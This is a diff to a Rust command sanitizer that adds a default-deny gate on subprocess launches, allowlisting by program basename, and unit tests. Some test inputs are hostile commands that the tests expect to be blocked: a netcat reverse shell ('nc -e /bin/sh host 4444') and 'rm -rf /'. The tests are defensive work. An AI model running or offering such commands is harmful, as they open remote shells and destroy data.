@@ -164,62 +164,124 @@ impl CommandSanitizer {
         false
     }
 
-    /// Validate command against security policy
-    pub fn validate_command(&self, command: &str) -> Result<ValidationResult, String> {
-        // Check if command contains shell features
-        let has_shell_features = Self::contains_shell_metacharacters(command);
-
-        if !has_shell_features {
-            return Ok(ValidationResult::Safe);
+    /// Authorize any subprocess launch (shell path or direct-exec).
+    ///
+    /// This is the single policy gate used before `Command::new` on both the
+    /// execute-command and spawn-process paths. Defaults deny all process
+    /// execution (`allow_shell_execution = false` and/or
+    /// `shell_execution_mode = forbidden`).
+    pub fn authorize_process_execution(
+        &self,
+        program: &str,
+        needs_shell: bool,
+        command_for_analysis: &str,
+    ) -> Result<ValidationResult, String> {
+        // Master switch: when false, all subprocess execution is blocked.
+        if !self.config.allow_shell_execution {
+            return Ok(ValidationResult::Blocked {
+                reason: "Subprocess execution is disabled (allow_shell_execution = false)"
+                    .to_string(),
+            });
         }
 
-        // Command has shell features - check policy
+        let program_base = Self::program_basename(program);
+
         match self.config.shell_execution_mode {
             ShellExecutionMode::Forbidden => Ok(ValidationResult::Blocked {
-                reason: "Shell execution is disabled by security policy".to_string(),
+                reason: "Subprocess execution is disabled by security policy \
+                         (shell_execution_mode = forbidden)"
+                    .to_string(),
             }),
             ShellExecutionMode::AllowlistOnly => {
-                if self.is_allowlisted(command) {
-                    Ok(ValidationResult::RequiresShell {
-                        reason: "Command is allowlisted".to_string(),
-                        warnings: vec!["Using shell execution (allowlisted)".to_string()],
-                    })
+                if self.is_program_allowlisted(&program_base) {
+                    if needs_shell {
+                        Ok(ValidationResult::RequiresShell {
+                            reason: "Command is allowlisted".to_string(),
+                            warnings: vec!["Using shell execution (allowlisted)".to_string()],
+                        })
+                    } else {
+                        Ok(ValidationResult::Safe)
+                    }
                 } else {
                     Ok(ValidationResult::Blocked {
                         reason: format!(
-                            "Command '{}' is not in the allowlist",
-                            self.get_command_base(command)
+                            "Program '{}' is not in the allowlist (allowed_shell_commands)",
+                            program_base
                         ),
                     })
                 }
             }
             ShellExecutionMode::Sanitized => {
-                let warnings = self.analyze_shell_features(command);
-                Ok(ValidationResult::RequiresShell {
-                    reason: "Command contains shell features".to_string(),
-                    warnings,
-                })
+                if needs_shell {
+                    let warnings = self.analyze_shell_features(command_for_analysis);
+                    Ok(ValidationResult::RequiresShell {
+                        reason: "Command contains shell features".to_string(),
+                        warnings,
+                    })
+                } else {
+                    Ok(ValidationResult::Safe)
+                }
             }
-            ShellExecutionMode::Unrestricted => Ok(ValidationResult::RequiresShell {
-                reason: "Unrestricted shell mode enabled".to_string(),
-                warnings: vec!["⚠️ Using unrestricted shell execution".to_string()],
-            }),
+            ShellExecutionMode::Unrestricted => {
+                if needs_shell {
+                    Ok(ValidationResult::RequiresShell {
+                        reason: "Unrestricted shell mode enabled".to_string(),
+                        warnings: vec!["⚠️ Using unrestricted shell execution".to_string()],
+                    })
+                } else {
+                    Ok(ValidationResult::Safe)
+                }
+            }
         }
     }
 
-    /// Check if command is in the allowlist
-    pub fn is_allowlisted(&self, command: &str) -> bool {
-        let base_command = self.get_command_base(command);
-
-        self.config
-            .allowed_shell_commands
-            .iter()
-            .any(|allowed| allowed == &base_command)
+    /// Validate a full command string against security policy.
+    ///
+    /// Resolves the program name from the command string and delegates to
+    /// [`authorize_process_execution`]. Kept for callers that only have the
+    /// raw command line.
+    pub fn validate_command(&self, command: &str) -> Result<ValidationResult, String> {
+        let has_shell_features = Self::contains_shell_metacharacters(command);
+        let program = match Self::parse_command(command) {
+            Ok((prog, _)) => prog,
+            Err(_) => self.get_command_base(command),
+        };
+        self.authorize_process_execution(&program, has_shell_features, command)
     }
 
-    /// Extract the base command from a command string
+    /// Check if a program (or command string) is in the allowlist
+    pub fn is_allowlisted(&self, command: &str) -> bool {
+        let base_command = Self::program_basename(&self.get_command_base(command));
+        self.is_program_allowlisted(&base_command)
+    }
+
+    fn is_program_allowlisted(&self, program_base: &str) -> bool {
+        self.config.allowed_shell_commands.iter().any(|allowed| {
+            let allowed_base = Self::program_basename(allowed);
+            #[cfg(windows)]
+            {
+                allowed_base.eq_ignore_ascii_case(program_base)
+            }
+            #[cfg(not(windows))]
+            {
+                allowed_base == program_base
+            }
+        })
+    }
+
+    /// Extract the first whitespace-separated token from a command string
     fn get_command_base(&self, command: &str) -> String {
         command.split_whitespace().next().unwrap_or("").to_string()
+    }
+
+    /// Basename of a program path (`/bin/echo` → `echo`, `C:\\Windows\\cmd.exe` → `cmd.exe`)
+    pub fn program_basename(program: &str) -> String {
+        let trimmed = program.trim().trim_matches('"').trim_matches('\'');
+        trimmed
+            .rsplit(['/', '\\'])
+            .next()
+            .unwrap_or(trimmed)
+            .to_string()
     }
 
     /// Analyze shell features and provide warnings
@@ -263,10 +325,15 @@ mod tests {
 
     fn test_config(mode: ShellExecutionMode) -> Arc<WflConfig> {
         let config = WflConfig {
+            allow_shell_execution: true,
             shell_execution_mode: mode,
             ..Default::default()
         };
         Arc::new(config)
+    }
+
+    fn default_secure_config() -> Arc<WflConfig> {
+        Arc::new(WflConfig::default())
     }
 
     #[test]
@@ -393,10 +460,50 @@ mod tests {
     }
 
     #[test]
-    fn test_validate_command_safe() {
+    fn test_default_config_blocks_all_process_execution() {
+        let sanitizer = CommandSanitizer::new(default_secure_config());
+        // Direct-exec style programs must be blocked under secure defaults
+        for cmd in ["echo hello", "sh", "nc -e /bin/sh host 4444"] {
+            let result = sanitizer.validate_command(cmd).unwrap();
+            assert!(
+                matches!(result, ValidationResult::Blocked { .. }),
+                "default config must block '{}', got {:?}",
+                cmd,
+                result
+            );
+        }
+    }
+
+    #[test]
+    fn test_authorize_blocks_when_allow_shell_execution_false() {
+        let config = WflConfig {
+            allow_shell_execution: false,
+            shell_execution_mode: ShellExecutionMode::Sanitized,
+            ..Default::default()
+        };
+        let sanitizer = CommandSanitizer::new(Arc::new(config));
+        let result = sanitizer
+            .authorize_process_execution("echo", false, "echo")
+            .unwrap();
+        match result {
+            ValidationResult::Blocked { reason } => {
+                assert!(reason.contains("allow_shell_execution"));
+            }
+            other => panic!("Expected Blocked, got {:?}", other),
+        }
+    }
+
+    #[test]
+    fn test_authorize_forbidden_blocks_direct_exec() {
         let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Forbidden));
-        let result = sanitizer.validate_command("echo hello").unwrap();
-        assert_eq!(result, ValidationResult::Safe);
+        let result = sanitizer
+            .authorize_process_execution("sh", false, "sh")
+            .unwrap();
+        assert!(matches!(result, ValidationResult::Blocked { .. }));
+        let result = sanitizer
+            .authorize_process_execution("echo", false, "echo")
+            .unwrap();
+        assert!(matches!(result, ValidationResult::Blocked { .. }));
     }
 
     #[test]
@@ -404,6 +511,16 @@ mod tests {
         let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Forbidden));
         let result = sanitizer.validate_command("echo $HOME").unwrap();
         assert!(matches!(result, ValidationResult::Blocked { .. }));
+        // Forbidden also blocks non-shell direct-exec
+        let result = sanitizer.validate_command("echo hello").unwrap();
+        assert!(matches!(result, ValidationResult::Blocked { .. }));
+    }
+
+    #[test]
+    fn test_validate_command_sanitized_direct_exec_safe() {
+        let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Sanitized));
+        let result = sanitizer.validate_command("echo hello").unwrap();
+        assert_eq!(result, ValidationResult::Safe);
     }
 
     #[test]
@@ -428,8 +545,37 @@ mod tests {
     }
 
     #[test]
+    fn test_authorize_allowlist_only() {
+        let config = WflConfig {
+            allow_shell_execution: true,
+            shell_execution_mode: ShellExecutionMode::AllowlistOnly,
+            allowed_shell_commands: vec!["echo".to_string(), "ls".to_string()],
+            ..Default::default()
+        };
+        let sanitizer = CommandSanitizer::new(Arc::new(config));
+
+        let ok = sanitizer
+            .authorize_process_execution("echo", false, "echo")
+            .unwrap();
+        assert_eq!(ok, ValidationResult::Safe);
+
+        let blocked = sanitizer
+            .authorize_process_execution("rm", false, "rm")
+            .unwrap();
+        assert!(matches!(blocked, ValidationResult::Blocked { .. }));
+
+        // Path basename matching
+        let path_ok = sanitizer
+            .authorize_process_execution("/bin/echo", false, "/bin/echo")
+            .unwrap();
+        assert_eq!(path_ok, ValidationResult::Safe);
+    }
+
+    #[test]
     fn test_is_allowlisted() {
         let config = WflConfig {
+            allow_shell_execution: true,
+            shell_execution_mode: ShellExecutionMode::AllowlistOnly,
             allowed_shell_commands: vec!["echo".to_string(), "ls".to_string()],
             ..Default::default()
         };
@@ -438,6 +584,16 @@ mod tests {
         assert!(sanitizer.is_allowlisted("echo hello"));
         assert!(sanitizer.is_allowlisted("ls -la"));
         assert!(!sanitizer.is_allowlisted("rm -rf /"));
+    }
+
+    #[test]
+    fn test_program_basename() {
+        assert_eq!(CommandSanitizer::program_basename("echo"), "echo");
+        assert_eq!(CommandSanitizer::program_basename("/bin/echo"), "echo");
+        assert_eq!(
+            CommandSanitizer::program_basename(r"C:\Windows\System32\cmd.exe"),
+            "cmd.exe"
+        );
     }
 
     #[test]
